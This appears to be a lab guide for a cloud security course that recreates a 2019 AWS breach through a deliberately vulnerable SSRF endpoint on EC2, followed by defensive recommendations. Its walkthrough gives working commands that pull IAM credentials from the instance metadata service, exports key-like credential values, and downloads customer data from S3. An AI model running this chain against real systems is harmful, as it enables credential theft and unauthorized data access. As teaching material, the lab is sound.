# 🌟 2019 AWS Data Breach Demo Lab Guide 🌟

## 🌐 Overview

This lab demonstrates an attack based on the SSRF (Server-Side Request Forgery) vulnerability, which can be used to steal AWS credentials from an Amazon EC2 instance and further access sensitive data in S3 buckets. The goal is to understand the potential impact of SSRF vulnerabilities in cloud environments and explore best practices for securing cloud infrastructure.

## 📖 The Story

In this lab, we simulate a real-world scenario where an attacker exploits a misconfigured web application on an EC2 instance. The vulnerable application allows the attacker to access the EC2 metadata service, retrieve IAM credentials, and subsequently gain unauthorized access to an S3 bucket. By performing this lab, we learn how simple misconfigurations can lead to serious security breaches in cloud environments.

![The Story](images/story.jpg)

## 🛠️ Lab Setup

### 🔧 Prerequisites

- An AWS user account with appropriate permissions.
- IAM user with permissions to create and manage resources.
- An EC2 instance running on AWS.
- A VPC to host the EC2 instance.
- An S3 bucket to store and access data.
- The EC2 instance must be accessible via the public internet.

![Lab Setup](images/lab.png)

### 📝 Lab Setup Steps

1. **📂 Clone the Repository**: Clone the repository that contains the necessary configuration files.
   
   ```sh
   git clone https://github.com/jasonYuRong/2019-AWS-Data-Breach-Demo.git
   ```

2. **📁 Navigate to the Directory**: Change into the cloned repository directory.
   
   ```sh
   cd 2019-AWS-Data-Breach-Demo
   ```

3. **🚀 Apply Terraform Configuration**: Use Terraform to set up the EC2 instance with the required configurations. This will automatically deploy Apache HTTP server and the vulnerable `ssrf.php` file.
   
   ```sh
   terraform apply
   ```

   Follow the prompts to approve the infrastructure changes. Terraform will create the EC2 instance along with the necessary configurations, including deploying Apache and the `ssrf.php` script.

## 🎯 Goal

The main goal of this lab is to gain unauthorized access to the S3 bucket by exploiting the SSRF vulnerability. Specifically, you will access the EC2 metadata service, obtain temporary AWS credentials, and use those credentials to retrieve an object from the S3 bucket.

## 💡 Solution & Walkthrough

### Step 1: 🚦 Launch an EC2 Instance and Ensure Accessibility

Make sure you have an AWS EC2 instance running with the following attributes:

- **Public IP**: A public IP address is assigned so it can be accessed from the internet.
- **IAM Role**: Configured with an IAM role (`ec2_role`) that has permissions to access S3 for the demo.

### Step 2: 🔍 Set Up the SSRF Vulnerability Environment

The Terraform script has already set up Apache HTTP server and deployed a vulnerable PHP file `ssrf.php` on your EC2 instance. This file allows an attacker to exploit SSRF to access resources that should not be accessible externally, such as the EC2 metadata service.

Ensure that the HTTP server is running and accessible via the public IP of your EC2 instance.

### Step 3: 🚨 Exploit the SSRF Vulnerability to Access EC2 Metadata

Now you can exploit the SSRF vulnerability to get the IAM role credentials from the EC2 metadata service.

Run the following `curl` command:

```sh
curl http://<EC2_public_ip>/ssrf.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_role
```

- `<EC2_public_ip>`: Replace with your EC2 public IP.
- `169.254.169.254`: This is the IP address of the AWS EC2 metadata service, which is only accessible from within the instance.

### Step 4: 🗝️ Extract AWS Credentials and Set Environment Variables

After running the above `curl` command, you should see the temporary credentials for the IAM role, which include:
- `AWS_ACCESS_KEY_ID`
- `AWS_SECRET_ACCESS_KEY`
- `AWS_SESSION_TOKEN`

Next, set these credentials as environment variables to use AWS CLI for further operations. For example:

```sh
export AWS_ACCESS_KEY_ID="ASIAZDZTCACO7BAZ7KEE"
export AWS_SECRET_ACCESS_KEY="S7z6biyOscdzDEVuLLLXa0GwHYRdN89ivkMy/4Dz"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEFYaCXV..."
```

### Step 5: 📥 Use AWS CLI to Access the S3 Bucket

Using the credentials set in the previous step, you can now use AWS CLI to access the specified S3 bucket.

For example, download a file from the S3 bucket:

```sh
aws s3 cp s3://jhu-en-650-603/customer.json - | cat
```

This command downloads the `customer.json` file from the S3 bucket and displays its contents in the terminal.

### 🎉 Lab Completion

At this point, we have successfully exploited an SSRF vulnerability in the EC2 instance to access the metadata service and used the retrieved credentials to access sensitive data in S3.

## 🔒 Reflection and Security Recommendations

1. **🚫 Restrict Metadata Access**:
   - Use `Instance Metadata Service v2 (IMDSv2)` to enhance security and prevent simple HTTP requests from accessing metadata.
   - In the instance's Terraform configuration, enforce IMDSv2 by setting:
     ```hcl
     metadata_options {
       http_tokens = "required"
       http_put_response_hop_limit = 1
     }
     ```

2. **🔑 Principle of Least Privilege**:
   - The IAM role assigned to the EC2 instance should follow the principle of least privilege, granting only the necessary S3 permissions to avoid over-privileged access.

3. **🛡️ Web Application Firewall (WAF)**:
   - Use a WAF to prevent SSRF attacks. WAFs can effectively block malicious requests to your web application.

4. **📝 Code Auditing and Input Validation**:
   - Ensure proper validation of user inputs to avoid directly using user input as part of a URL request.

## 📜 Lab Summary

This lab demonstrated the dangers of SSRF attacks in a cloud environment, showcasing the potential to leverage such vulnerabilities to further attack AWS infrastructure. The goal was to exploit SSRF to gain unauthorized access to S3 and retrieve sensitive data. Hopefully, this demo helps you better understand how to prevent similar security risks and apply the principle of least privilege and secure configurations.
